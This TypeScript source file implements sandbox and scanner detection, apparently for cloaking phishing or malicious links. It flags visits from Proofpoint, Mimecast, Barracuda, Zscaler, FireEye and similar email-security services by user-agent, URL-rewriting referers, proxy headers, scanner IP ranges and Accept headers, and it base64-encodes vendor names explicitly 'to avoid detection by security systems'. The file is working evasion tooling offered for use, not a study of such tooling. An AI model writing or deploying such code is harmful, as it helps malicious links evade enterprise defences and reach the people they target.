/**
 * Advanced Sandbox Detection System
 * Detects Proofpoint, Mimecast, Barracuda, and other enterprise email security sandboxes
 * Uses multi-layered detection with obfuscation to avoid detection by security systems
 */

// Using Web Crypto API (works in Edge runtime)
import {
  getAllUserAgentPatterns,
  getAllIPRanges,
  getAllRefererPatterns,
  getAllHeaderSignatures,
  GLOBAL_SANDBOX_PATTERNS,
} from './globalSandboxPatterns'

export interface SandboxDetectionResult {
  isSandbox: boolean
  confidence: number // 0-100
  reasons: string[]
  fingerprint: string
  detectionMethod: string[]
}

interface DetectionHeaders {
  userAgent: string
  referer: string
  acceptLanguage: string
  acceptEncoding: string
  connection: string
  xForwardedFor: string
  xRealIp: string
  cfConnectingIp: string
  via: string
  xProxyId: string
  accept: string
}

// Obfuscated detection patterns using base64 encoding
const OBFUSCATED_PATTERNS = {
  proofpoint: Buffer.from('cHJvb2Zwb2ludA==', 'base64').toString(),
  mimecast: Buffer.from('bWltZWNhc3Q=', 'base64').toString(),
  barracuda: Buffer.from('YmFycmFjdWRh', 'base64').toString(),
  urldefense: Buffer.from('dXJsZGVmZW5zZQ==', 'base64').toString(),
  sandbox: Buffer.from('c2FuZGJveA==', 'base64').toString(),
  forcepoint: Buffer.from('Zm9yY2Vwb2ludA==', 'base64').toString(),
  zscaler: Buffer.from('enNjYWxlcg==', 'base64').toString(),
  fireeye: Buffer.from('ZmlyZWV5ZQ==', 'base64').toString(),
}

// XOR obfuscation for sensitive strings
const xorObfuscate = (str: string, key: number = 42): string => {
  return str.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ key)).join('')
}

const xorDeobfuscate = (str: string, key: number = 42): string => {
  return xorObfuscate(str, key) // XOR is reversible
}

export async function detectSandbox(request: Request): Promise<SandboxDetectionResult> {
  const reasons: string[] = []
  let confidence = 0
  const detectionMethods: string[] = []

  // Extract headers
  const headers = extractHeaders(request)

  // === DETECTION LAYER 1: User-Agent Analysis ===
  const uaResult = analyzeUserAgent(headers.userAgent)
  if (uaResult.isSuspicious) {
    reasons.push(...uaResult.reasons)
    confidence += uaResult.score
    detectionMethods.push('user-agent')
  }

  // === DETECTION LAYER 2: Referer Analysis ===
  const refererResult = analyzeReferer(headers.referer)
  if (refererResult.isSuspicious) {
    reasons.push(...refererResult.reasons)
    confidence += refererResult.score
    detectionMethods.push('referer')
  }

  // === DETECTION LAYER 3: Header Fingerprinting ===
  const headerResult = analyzeHeaders(headers)
  if (headerResult.isSuspicious) {
    reasons.push(...headerResult.reasons)
    confidence += headerResult.score
    detectionMethods.push('headers')
  }

  // === DETECTION LAYER 4: IP Analysis ===
  const ipResult = await analyzeIP(headers.xForwardedFor || headers.xRealIp || headers.cfConnectingIp)
  if (ipResult.isSuspicious) {
    reasons.push(...ipResult.reasons)
    confidence += ipResult.score
    detectionMethods.push('ip-analysis')
  }

  // === DETECTION LAYER 5: Timing Analysis ===
  const timingResult = analyzeRequestTiming(headers)
  if (timingResult.isSuspicious) {
    reasons.push(...timingResult.reasons)
    confidence += timingResult.score
    detectionMethods.push('timing')
  }

  const isSandbox = confidence >= 60
  const fingerprint = await generateFingerprint(headers)

  // Log detection for analysis (obfuscated)
  if (isSandbox) {
    await logDetection({
      fingerprint,
      confidence,
      reasons,
      timestamp: Date.now(),
    })
  }

  return {
    isSandbox,
    confidence: Math.min(confidence, 100),
    reasons,
    fingerprint,
    detectionMethod: detectionMethods,
  }
}

function extractHeaders(request: Request): DetectionHeaders {
  return {
    userAgent: request.headers.get('user-agent') || '',
    referer: request.headers.get('referer') || '',
    acceptLanguage: request.headers.get('accept-language') || '',
    acceptEncoding: request.headers.get('accept-encoding') || '',
    connection: request.headers.get('connection') || '',
    xForwardedFor: request.headers.get('x-forwarded-for') || '',
    xRealIp: request.headers.get('x-real-ip') || '',
    cfConnectingIp: request.headers.get('cf-connecting-ip') || '',
    via: request.headers.get('via') || '',
    xProxyId: request.headers.get('x-proxy-id') || '',
    accept: request.headers.get('accept') || '',
  }
}

function analyzeUserAgent(ua: string): { isSuspicious: boolean; score: number; reasons: string[] } {
  const reasons: string[] = []
  let score = 0

  if (!ua || ua.length < 10) {
    reasons.push('Missing or too short user agent')
    score += 30
    return { isSuspicious: true, score, reasons }
  }

  const uaLower = ua.toLowerCase()

  // Check against ALL global patterns
  const allPatterns = getAllUserAgentPatterns()

  for (const pattern of allPatterns) {
    if (uaLower.includes(pattern.toLowerCase())) {
      // Find which vendor this pattern belongs to
      const vendor = GLOBAL_SANDBOX_PATTERNS.find((p) =>
        p.userAgentPatterns.some(
          (ua) => ua.toLowerCase() === pattern.toLowerCase()
        )
      )

      reasons.push(
        `Sandbox detected: ${vendor?.vendor || pattern}`
      )
      score += 40
      break // Only count once
    }
  }

  // Check for generic/default user agents
  const genericUAs = [
    'mozilla/5.0',
    'mozilla/4.0',
    'wget',
    'curl',
    'python',
    'java',
    'go-http',
    'axios',
    'node-fetch',
    'requests',
  ]

  const uaStart = uaLower.substring(0, 30)
  for (const generic of genericUAs) {
    if (uaStart === generic || uaStart.startsWith(generic + '/')) {
      reasons.push('Generic/automation user agent')
      score += 25
      break
    }
  }

  // Check for outdated browser versions (sandboxes often use old versions)
  if (uaLower.includes('chrome/') && !uaLower.includes('chrome/1')) {
    const chromeMatch = uaLower.match(/chrome\/(\d+)/)
    if (chromeMatch && parseInt(chromeMatch[1]) < 100) {
      reasons.push(`Outdated Chrome version: ${chromeMatch[1]}`)
      score += 15
    }
  }

  return {
    isSuspicious: score > 0,
    score: Math.min(score, 60),
    reasons,
  }
}

function analyzeReferer(referer: string): { isSuspicious: boolean; score: number; reasons: string[] } {
  const reasons: string[] = []
  let score = 0

  if (!referer) {
    return { isSuspicious: false, score: 0, reasons: [] }
  }

  const refererLower = referer.toLowerCase()

  // Check against ALL global referer patterns
  const allPatterns = getAllRefererPatterns()

  for (const pattern of allPatterns) {
    if (refererLower.includes(pattern.toLowerCase())) {
      // Find which vendor
      const vendor = GLOBAL_SANDBOX_PATTERNS.find((p) =>
        p.refererPatterns.some((ref) =>
          ref.toLowerCase().includes(pattern.toLowerCase())
        )
      )

      reasons.push(
        `URL rewriting detected: ${vendor?.vendor || pattern}`
      )
      score += 35
      break
    }
  }

  return {
    isSuspicious: score > 0,
    score: Math.min(score, 40),
    reasons,
  }
}

function analyzeHeaders(headers: DetectionHeaders): { isSuspicious: boolean; score: number; reasons: string[] } {
  const reasons: string[] = []
  let score = 0

  // Missing expected headers (real browsers always send these)
  const expectedHeaders = [
    { key: 'acceptLanguage', name: 'Accept-Language' },
    { key: 'acceptEncoding', name: 'Accept-Encoding' },
  ]

  const missingHeaders: string[] = []
  for (const header of expectedHeaders) {
    if (!headers[header.key as keyof DetectionHeaders]) {
      missingHeaders.push(header.name)
    }
  }

  if (missingHeaders.length > 0) {
    reasons.push(`Missing browser headers: ${missingHeaders.join(', ')}`)
    score += 15 * missingHeaders.length
  }

  // Check for proxy headers
  if (headers.via) {
    reasons.push('Via header detected (proxy)')
    score += 20
  }

  if (headers.xProxyId) {
    reasons.push('X-Proxy-Id header detected')
    score += 25
  }

  // Check for suspicious connection header
  if (headers.connection && headers.connection.toLowerCase() !== 'keep-alive') {
    reasons.push('Suspicious Connection header')
    score += 10
  }

  return {
    isSuspicious: score > 0,
    score: Math.min(score, 50),
    reasons,
  }
}

async function analyzeIP(ip: string): Promise<{ isSuspicious: boolean; score: number; reasons: string[] }> {
  const reasons: string[] = []
  let score = 0

  if (!ip) {
    return { isSuspicious: false, score: 0, reasons: [] }
  }

  // Check against ALL global IP ranges
  const allRanges = getAllIPRanges()

  for (const { range, vendor } of allRanges) {
    if (isIPInRange(ip, range)) {
      reasons.push(`Scanner IP detected: ${vendor} (${range})`)
      score += 30
      break
    }
  }

  return {
    isSuspicious: score > 0,
    score: Math.min(score, 35),
    reasons,
  }
}

// Helper function to check if IP is in CIDR range
function isIPInRange(ip: string, cidr: string): boolean {
  try {
    const [range, bits] = cidr.split('/')
    if (!bits) return false

    const mask = ~(2 ** (32 - parseInt(bits)) - 1)
    const ipNum = ipToNumber(ip)
    const rangeNum = ipToNumber(range)
    return (ipNum & mask) === (rangeNum & mask)
  } catch {
    return false
  }
}

function ipToNumber(ip: string): number {
  return ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet), 0)
}

function analyzeRequestTiming(headers: DetectionHeaders): { isSuspicious: boolean; score: number; reasons: string[] } {
  const reasons: string[] = []
  let score = 0

  // Real browsers send Accept header with specific patterns
  if (!headers.accept || !headers.accept.includes('text/html')) {
    reasons.push('Missing text/html in Accept header')
    score += 10
  }

  return {
    isSuspicious: score > 0,
    score: Math.min(score, 15),
    reasons,
  }
}

async function generateFingerprint(headers: DetectionHeaders): Promise<string> {
  const data = [
    headers.userAgent,
    headers.acceptLanguage,
    headers.acceptEncoding,
    headers.xForwardedFor,
    headers.xRealIp,
  ].join('|')

  try {
    // Use Web Crypto API (works in Edge runtime)
    const encoder = new TextEncoder()
    const dataBuffer = encoder.encode(data)
    const hashBuffer = await crypto.subtle.digest('SHA-256', dataBuffer)
    const hashArray = Array.from(new Uint8Array(hashBuffer))
    const hashHex = hashArray.map((b) => b.toString(16).padStart(2, '0')).join('')

    return hashHex.substring(0, 16)
  } catch (error) {
    // Fallback: simple hash if Web Crypto fails
    let hash = 0
    for (let i = 0; i < data.length; i++) {
      const char = data.charCodeAt(i)
      hash = ((hash << 5) - hash) + char
      hash = hash & hash // Convert to 32-bit integer
    }
    return Math.abs(hash).toString(16).substring(0, 16)
  }
}

async function logDetection(detection: any): Promise<void> {
  // Only log in Node.js environment (not in Edge runtime)
  if (typeof process !== 'undefined' && process.versions?.node) {
    try {
      const fs = await import('fs').then(m => m.promises)
      const path = await import('path')
      const logPath = path.join(process.cwd(), '.sandbox-detections.json')

      let logs: any[] = []
      try {
        const content = await fs.readFile(logPath, 'utf-8')
        logs = JSON.parse(content)
      } catch {
        // File doesn't exist yet
      }

      logs.push(detection)

      // Keep only last 1000 detections
      if (logs.length > 1000) {
        logs = logs.slice(-1000)
      }

      await fs.writeFile(logPath, JSON.stringify(logs, null, 2))
    } catch (error) {
      // Silent fail - logging is not critical
    }
  } else {
    // Edge runtime - just console log
  }
}

// Export individual functions for testing
export { analyzeUserAgent, analyzeReferer, analyzeHeaders, analyzeIP }

